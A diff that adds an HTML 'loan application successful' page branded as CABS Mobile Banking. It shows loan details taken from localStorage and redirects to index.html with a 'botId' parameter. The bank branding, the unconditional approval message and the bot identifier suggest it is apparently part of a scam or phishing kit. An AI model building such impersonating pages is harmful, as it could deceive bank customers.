@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CABS Mobile Banking - Success</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+        }
+
+        .app-wrapper {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* ── top bar (CABS blue) ── */
+        .top-bar {
+            height: 72px;
+            background: #0d47a1;
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            color: #fff;
+            font-size: 30px;
+            text-decoration: none;
+            font-weight: 300;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+        }
+
+        /* ── container ── */
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 28px 100px;
+            text-align: center;
+        }
+
+        /* ── success icon ── */
+        .icon-wrapper {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: #e8f5e9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 28px;
+            box-shadow: 0 8px 24px rgba(13, 71, 161, 0.15);
+        }
+
+        .checkmark {
+            font-size: 60px;
+            color: #2e7d32;
+            line-height: 1;
+        }
+
+        /* ── text ── */
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0d47a1;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .sub-message {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            max-width: 320px;
+            margin: 0 auto 8px;
+        }
+
+        .detail-box {
+            background: #f8f8fc;
+            border-radius: 16px;
+            padding: 20px 24px;
+            margin-top: 24px;
+            width: 100%;
+            max-width: 320px;
+            border: 1px solid #e8e8f0;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 15px;
+            border-bottom: 1px solid #e8e8f0;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #777;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: #1a1a2e;
+            font-weight: 600;
+        }
+
+        /* ── button ── */
+        .action-btn {
+            width: 100%;
+            max-width: 320px;
+            padding: 16px;
+            background: #0d47a1;
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 32px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(13, 71, 161, 0.3);
+        }
+
+        .action-btn:hover {
+            background: #0a3a8a;
+            transform: scale(1.01);
+        }
+
+        .action-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* ── footer ── */
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #bbb;
+            letter-spacing: 0.5px;
+            padding-bottom: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 20px 100px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .icon-wrapper {
+                width: 80px;
+                height: 80px;
+            }
+            .checkmark {
+                font-size: 48px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-wrapper">
+
+    <!-- Top bar (CABS) -->
+    <div class="top-bar">
+        <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+    </div>
+
+    <div class="container">
+
+        <!-- Success Icon -->
+        <div class="icon-wrapper">
+            <span class="checkmark">✓</span>
+        </div>
+
+        <h1 class="title">Application Successful!</h1>
+        <p class="sub-message">
+            Your loan application has been approved. You will receive the funds shortly.
+        </p>
+
+        <!-- Optional detail box – dynamic from localStorage if available -->
+        <div class="detail-box" id="detailBox">
+            <div class="detail-row">
+                <span class="detail-label">Amount</span>
+                <span class="detail-value" id="displayAmount">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Term</span>
+                <span class="detail-value" id="displayTerm">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Reference</span>
+                <span class="detail-value" id="displayRef">CABS-2026-001</span>
+            </div>
+        </div>
+
+        <!-- Action button -->
+        <button class="action-btn" id="doneBtn">Go to Dashboard</button>
+
+        <div class="footer">v 5.3.2 (1.0.0)</div>
+    </div>
+
+</div>
+
+<script>
+    (function() {
+        // Retrieve loan details from localStorage if available
+        const loanAmount = localStorage.getItem('loanAmount');
+        const loanTerm = localStorage.getItem('loanTerm');
+        const fullName = localStorage.getItem('fullName') || 'Customer';
+
+        const amountEl = document.getElementById('displayAmount');
+        const termEl = document.getElementById('displayTerm');
+
+        if (loanAmount) {
+            const num = parseFloat(loanAmount);
+            if (!isNaN(num)) {
+                amountEl.textContent = '$' + num.toLocaleString('en-US');
+            } else {
+                amountEl.textContent = loanAmount;
+            }
+        }
+
+        if (loanTerm) {
+            termEl.textContent = loanTerm + ' months';
+        }
+
+        // If no data, hide the detail box? Or keep with placeholders.
+        // For demo, we keep it.
+
+        // "Go to Dashboard" button – you can redirect to a dashboard page or home.
+        document.getElementById('doneBtn').addEventListener('click', function() {
+            // You can change this to the actual dashboard URL.
+            // For now, we'll reload the loan calculator or go to index.
+            const botId = localStorage.getItem('botId');
+            if (botId) {
+                window.location.href = 'index.html?botId=' + encodeURIComponent(botId);
+            } else {
+                window.location.href = 'index.html';
+            }
+        });
+
+        // Optionally, you can also clear some localStorage items if you want to reset.
+        // But we'll leave it as is.
+    })();
+</script>
+
+</body>
+</html>
